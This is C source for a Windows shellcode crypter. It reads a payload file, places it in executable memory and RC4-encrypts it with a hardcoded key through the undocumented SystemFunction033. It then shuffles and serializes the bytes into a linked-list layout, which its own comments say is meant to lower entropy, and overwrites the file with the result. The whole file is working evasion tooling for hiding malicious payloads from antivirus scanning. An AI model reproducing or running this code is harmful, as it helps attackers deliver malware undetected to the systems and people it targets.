#include <Windows.h>
#include <stdio.h>

#include "common.h"

// Serialization and Obfuscation Function
BOOL Obfuscate(IN PBYTE PayloadBuffer, IN SIZE_T PayloadSize, OUT PBYTE* ObfuscatedBuffer, OUT PSIZE_T ObfuscatedSize, OUT PSIZE_T PaddingSize) {

    PLINKED_LIST pLinkedList = NULL;
    *ObfuscatedSize = PayloadSize;
    *PaddingSize = 0;

    // convert the payload to a linked list
    if (!InitializePayloadList(PayloadBuffer, ObfuscatedSize, &pLinkedList, PaddingSize))
        return 0;

    // ObfuscatedSize now is the size of the serialized linked list
    // pLinkedList is the head of the linked list
    // randomize the linked list (sorted by the value of 'Buffer[0] ^ Buffer[1] ^ Buffer[3]')
    MergeSort(&pLinkedList, SORT_BY_BUFFER);

    PLINKED_LIST pTmpHead = pLinkedList;
    SIZE_T BufferSize = NULL;
    PBYTE BufferBytes = (PBYTE)LocalAlloc(LPTR, SERIALIZED_SIZE);

    // Serialize the linked list
    while (pTmpHead != NULL) {

        // this buffer will keep data of each node
        BYTE TmpBuffer[SERIALIZED_SIZE] = { 0 };

        // copying the payload buffer
        memcpy(TmpBuffer, pTmpHead->pBuffer, BUFF_SIZE);
        // no need to copy the 'Null' element, cz its NULL already
        // copying the ID value
        memcpy((TmpBuffer + BUFF_SIZE + NULL_BYTES), &pTmpHead->ID, sizeof(int));

        // reallocating and moving 'TmpBuffer' to the final buffer
        BufferSize += SERIALIZED_SIZE;

        if (BufferBytes != NULL) {
            BufferBytes = (PBYTE)LocalReAlloc(BufferBytes, BufferSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
            memcpy((PVOID)(BufferBytes + (BufferSize - SERIALIZED_SIZE)), TmpBuffer, SERIALIZED_SIZE);
        }

        // next node
        pTmpHead = pTmpHead->Next;
    }

    // 'BufferBytes' is the serialized buffer
    *ObfuscatedBuffer = BufferBytes;

    if (*ObfuscatedBuffer != NULL && *ObfuscatedSize > PayloadSize)
        return 1;
    else
        return 0;
}

// Function prototype for SystemFunction033
typedef NTSTATUS(WINAPI* _SystemFunction033)(
    struct ustring* memoryRegion,
    struct ustring* keyPointer);

// Struct of ustring
struct ustring {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} _data, key, _data2;

// Main Function
int main(int argc, char* argv[]) {

    if (!(argc >= 2)) {
        printf("[!] Please Specify A Input File To Encrypt and Obfuscate ... \n");
        return -1;
    }
    printf("[i] BUFF_SIZE : [ 0x%0.4X ] - NULL_BYTES : [ 0x%0.4X ]\n", BUFF_SIZE, NULL_BYTES);

    // Seed the random number generator
    srand(time(NULL));

    // Load the SystemFunction033
    _SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibrary(L"advapi32"), "SystemFunction033");

    // The Key
    BYTE _key[KEY_SIZE] = { 0xA7, 0x4E, 0x70, 0x79, 0x01, 0xB0, 0x3D, 0x74, 0x27, 0x3A, 0xED, 0xBD, 0x85, 0xB8, 0xE9, 0xA5 };

    //Original Obfuscation functions.
    SIZE_T RawPayloadSize = NULL;
    PBYTE RawPayloadBuffer = NULL;

    // Read the Payload
    printf("[i] Reading \"%s\" ... ", argv[1]);
    if (!ReadPayloadFile(argv[1], &RawPayloadBuffer, &RawPayloadSize)) {
        return -1;
    }
    printf("[+] DONE \n");
    printf("\t>>> Raw Payload Size : %ld \n\t>>> Read Payload Located At : 0x%p \n", RawPayloadSize, RawPayloadBuffer);

    // Encrypt the Payload
    PVOID ShellcodeBuffer = VirtualAlloc(NULL, RawPayloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    // Copy the Payload to the Shellcode Buffer
    memcpy(ShellcodeBuffer, RawPayloadBuffer, RawPayloadSize);

    // Encrypt the Payload
    key.Buffer = (&_key);
    key.Length = sizeof(_key);
    _data.Buffer = ShellcodeBuffer;
    _data.Length = RawPayloadSize;

    SystemFunction033(&_data, &key);
    printf("[+] Payload Encrypted with RC4.\n");

    SIZE_T ObfuscatedPayloadSize = NULL;
    PBYTE ObfuscatedPayloadBuffer = NULL;
    SIZE_T PaddingSize = 0;

    // Obfuscate the Payload
    printf("[i] Obfuscating Payload to reduce entropy...\n");
    if (!Obfuscate((PBYTE)ShellcodeBuffer, RawPayloadSize, &ObfuscatedPayloadBuffer, &ObfuscatedPayloadSize, &PaddingSize)) {
        return -1;
    }
    printf("[+] DONE \n");
    printf("\t>>> Obfuscated Payload Size : %ld \n\t>>> Obfuscated Payload Located At : 0x%p \n", ObfuscatedPayloadSize, ObfuscatedPayloadBuffer);
    printf("\t>>> Padding Size : %ld \n", PaddingSize);

    // Create a memory block of the value KEY_SIZE and put the PaddingSize value in it
    PBYTE PaddingSizeBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, KEY_SIZE);
    if (PaddingSizeBuffer == NULL) {
        printf("[!] Failed to allocate memory for PaddingSizeBuffer.\n");
        return -1;
    }
    memcpy(PaddingSizeBuffer, &PaddingSize, sizeof(SIZE_T));
    printf("[i] PaddingSize value stored in memory block: %ld\n", *(SIZE_T*)PaddingSizeBuffer);

    // Create a new memory block with the first 0x10 bytes containing PaddingSizeBuffer and the rest containing ObfuscatedBuffer
    SIZE_T NewBufferSize = KEY_SIZE + ObfuscatedPayloadSize;
	printf("[i] New Buffer Size: %ld\n", NewBufferSize);
    PBYTE NewBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, NewBufferSize);
    if (NewBuffer == NULL) {
        printf("[!] Failed to allocate memory for NewBuffer.\n");
        HeapFree(GetProcessHeap(), 0, PaddingSizeBuffer);
        return -1;
    }
    memcpy(NewBuffer, PaddingSizeBuffer, 0x10);
    memcpy(NewBuffer + 0x10, ObfuscatedPayloadBuffer, ObfuscatedPayloadSize);

    // Write the new buffer
    printf("[i] Writing The Obfuscated Payload ...\n");
    if (!WritePayloadFile(argv[1], NewBuffer, NewBufferSize)) {
        return -1;
    }
    printf("[+] DONE \n");

    return 0;
}